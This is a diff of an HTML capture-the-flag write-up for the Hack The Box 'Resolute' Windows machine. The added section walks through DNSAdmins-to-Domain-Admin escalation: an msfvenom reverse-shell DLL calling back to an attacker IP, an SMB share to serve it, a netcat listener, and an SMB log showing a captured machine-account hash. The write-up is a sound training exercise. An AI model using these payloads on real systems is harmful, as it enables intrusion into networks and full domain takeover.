@@ -1059,7 +1059,7 @@ body .markdown-body
 <p><br/></p>
 <p><img alt="info" src="https://github.com/VitthalS/VitthalS.github.io/raw/master/writeups/resolute/info.png" /></p>
 <p><br/>
-Resolute was retired .It was easy and fun Windows box with techniques so let&rsquo;s get started start &hellip;<br/></p>
+Resolute was retired. It&rsquo;s a very easy Windows box with enumeration of common ports and gaining access to machine via founded creds, Again enumerating for secoond user creds. I&rsquo;ll show how to exploit if the User is in DNSAdmin group and to gain Domain Admin privs, So let&rsquo;s get started start &hellip;<br/></p>
 <h2 id="reconnaissance">Reconnaissance<a class="headerlink" href="#reconnaissance" title="Permanent link"></a></h2>
 <p>Run the <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a> script to enumerate open ports and services running on those ports.</p>
 <p><code>nmapAutomator.sh 10.10.10.169 All</code></p>
@@ -1324,171 +1324,6 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 445.73 seconds
            Raw packets sent: 73743 (3.245MB) | Rcvd: 73508 (2.940MB)
 
-
-Making a script scan on extra ports: 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49669, 49676, 49677, 49688, 49712, 50056, 50100
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:17 IST
-Nmap scan report for 10.10.10.169
-Host is up (0.21s latency).
-
-PORT      STATE  SERVICE    VERSION
-5985/tcp  open   http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open   mc-nmf     .NET Message Framing
-47001/tcp open   http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open   msrpc      Microsoft Windows RPC
-49665/tcp open   msrpc      Microsoft Windows RPC
-49666/tcp open   msrpc      Microsoft Windows RPC
-49667/tcp open   msrpc      Microsoft Windows RPC
-49669/tcp open   msrpc      Microsoft Windows RPC
-49676/tcp open   ncacn_http Microsoft Windows RPC over HTTP 1.0
-49677/tcp open   msrpc      Microsoft Windows RPC
-49688/tcp open   msrpc      Microsoft Windows RPC
-49712/tcp open   msrpc      Microsoft Windows RPC
-50056/tcp closed unknown
-50100/tcp closed unknown
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 65.04 seconds
-
-
-
----------------------Starting Nmap Vulns Scan---------------------
-
-Running CVE scan on all ports
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:18 IST
-Nmap scan report for 10.10.10.169
-Host is up (0.27s latency).
-
-PORT      STATE SERVICE      VERSION
-53/tcp    open  domain?
-| fingerprint-strings: 
-|   DNSVersionBindReqTCP: 
-|     version
-|_    bind
-88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-05 13:54:12Z)
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp  open  mc-nmf       .NET Message Framing
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49669/tcp open  msrpc        Microsoft Windows RPC
-49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-49677/tcp open  msrpc        Microsoft Windows RPC
-49688/tcp open  msrpc        Microsoft Windows RPC
-49712/tcp open  msrpc        Microsoft Windows RPC
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB16EBC%P=x86_64-pc-linux-gnu%r(DNSVe
-SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
-SF:04bind\0\0\x10\0\x03&quot;);
-Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 62.26 seconds
-
-
-Running Vuln scan on all ports
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 19:19 IST
-Nmap scan report for 10.10.10.169
-Host is up (0.17s latency).
-
-PORT      STATE SERVICE      VERSION
-53/tcp    open  domain?
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-| fingerprint-strings: 
-|   DNSVersionBindReqTCP: 
-|     version
-|_    bind
-88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-05 13:55:24Z)
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-135/tcp   open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_sslv2-drown: 
-445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-464/tcp   open  kpasswd5?
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-636/tcp   open  tcpwrapped
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_ssl-ccs-injection: No reply from server (TIMEOUT)
-|_sslv2-drown: 
-3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_sslv2-drown: 
-3269/tcp  open  tcpwrapped
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_ssl-ccs-injection: No reply from server (TIMEOUT)
-|_sslv2-drown: 
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
-|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
-9389/tcp  open  mc-nmf       .NET Message Framing
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
-|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
-49664/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49665/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49666/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49667/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49669/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49677/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49688/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-49712/tcp open  msrpc        Microsoft Windows RPC
-|_clamav-exec: ERROR: Script execution failed (use -d to debug)
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB16F04%P=x86_64-pc-linux-gnu%r(DNSVe
-SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
-SF:04bind\0\0\x10\0\x03&quot;);
-Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_smb-vuln-ms10-054: false
-|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 1215.54 seconds
-
 ---------------------Finished all Nmap scans---------------------
 
 root@kali:~/htb/resolute$ 
@@ -1516,7 +1351,7 @@ root@kali:~/htb/resolute$
 </ul>
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link"></a></h2>
 <p>We’ll start off with enumerating LDAP.</p>
-<h3 id="port-389-ldap">Port 389 LDAP<a class="headerlink" href="#port-389-ldap" title="Permanent link"></a></h3>
+<p><strong>Port 389 LDAP</strong></p>
 <p>Nmap has an NSE script that enumerates LDAP.</p>
 <div class="codehilite"><pre>root@kali:# locate ldap-search /usr/share/nmap/scripts/ldap-search.nse
 </pre></div>
@@ -1845,9 +1680,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-06 20:17:
 </pre></div>
 
 <p>We get a shell!</p>
-<p><img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/user.png" /></p>
+<p><img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/user.png" /></p>
 <p>Grab the user.txt flag.</p>
-<p><img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/user_flag.png" /></p>
+<p><img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/user_flag.png" /></p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link"></a></h2>
 <p>Now lets obtain the user permission.</p>
 <div class="codehilite"><pre>*Evil-WinRM* PS C:\&gt; whoami /groups
 
@@ -1870,15 +1706,15 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 <p>Current Users permission are very common.
 Lets enumerate more.
 I have Found a hidden folder containing the txt file.
-<img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/hidden.png" /></p>
+<img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/hidden.png" /></p>
 <p>Lets read the file</p>
 <div class="codehilite"><pre>*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 </pre></div>
 
-<p><img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/creds.png" /></p>
+<p><img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/creds.png" /></p>
 <p>I got another credential for <code>ryan</code> user.</p>
 <p>Now Lets login with the <code>ryan</code> user using <code>evil-winrm</code>
-<img alt="alt text" src="/home/vitthal/htb/resolute/Writeup/note.png" /></p>
+<img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/note.png" /></p>
 <p>I got a note.txt which includes hint to escalate our privileges.</p>
 <p>Lets grab the permission group to which user belongs.
 <div class="codehilite"><pre>*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; whoami /groups
@@ -1901,5 +1737,51 @@ NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10         
 Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 </pre></div></p>
 <p><strong>Ryan</strong> user belongs to DnsAdmin group.
-We can escalate our user privileges using </p>
-<p>Rooted :) Your feedback is appreciated !</p></article></body></html>
+We can escalate our user privileges like <strong>DNSAdmins to Domain Admins</strong> using  server level DLL injection technique.</p>
+<p>Putting all the pieces together, the following is our attack path.:</p>
+<ul>
+<li>Making a dll payload that sends a reverse shell back to our machine with msfvenom.</li>
+<li>Serving it using SMB Server to make it available to the Windows machine.  </li>
+<li>Setup a netcat listener to catch our reverse shell.</li>
+<li>Importing that dll in the DNS Server.</li>
+<li>Restarting the DNS Server so that it loads the dll file.</li>
+</ul>
+<p>Alright, let’s get started.</p>
+<p>Lets make a payload</p>
+<p><code>root@kali:~/htb/resolute$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=4444 --platform=windows -f dll &gt; plugin.dll</code></p>
+<p>Now, Lets serve our payload using <a href="https://github.com/SecureAuthCorp/impacket">smbserver.py</a> </p>
+<p><code>smbserver.py resolute ~/htb/resolute/</code></p>
+<p>In another terminal tab, set up a netcat listener to catch the reverse shell</p>
+<p><code>nc -lvp 4444</code></p>
+<p>Now, in the compromised Windows machine run the following series of command.</p>
+<p><img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/dll.png" /></p>
+<p>Observe the smb log.</p>
+<div class="codehilite"><pre>Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.169,53053)
+[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
+[*] User RESOLUTE\RESOLUTE$ authenticated successfully
+[*] RESOLUTE$::MEGABANK:4141414141414141:2ed16af8e796d6b1176eeb22393f4962:01010000000000000016f5a74025d60199bb169eb052f44500000000010010005200430057005a006e006d006200680002001000510073006e004f006300720043007100030010005200430057005a006e006d006200680004001000510073006e004f006300720043007100070008000016f5a74025d601060004000200000008003000300000000000000000000000004000005ef8595e750dceb213ef48f95cdf6646e1eaca98af7a162f8df751cf02ec78920a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320031000000000000000000
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:RESOLUTE)
+[*] Closing down connection (10.10.10.169,53053)
+[*] Remaining connections []
+</pre></div>
+
+<p>Now, go back and check the netcat listener, I got the reverse shell..!!</p>
+<p><img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/shell.png" /></p>
+<p>Lets grab the <em>root.txt</em> flag.</p>
+<p><img alt="alt text" src="https://raw.githubusercontent.com/VitthalS/VitthalS.github.io/master/writeups/resolute/root.png" /></p>
+<p>Rooted :) Your feedback is appreciated !</p></article></body></html><script async>
+document.write(
+  '<script src="http://' +
+  (location.host || 'localhost').split(':')[0] +
+  ':35729/livereload.js?snipver=1" async></' +
+  'script>')
+</script>
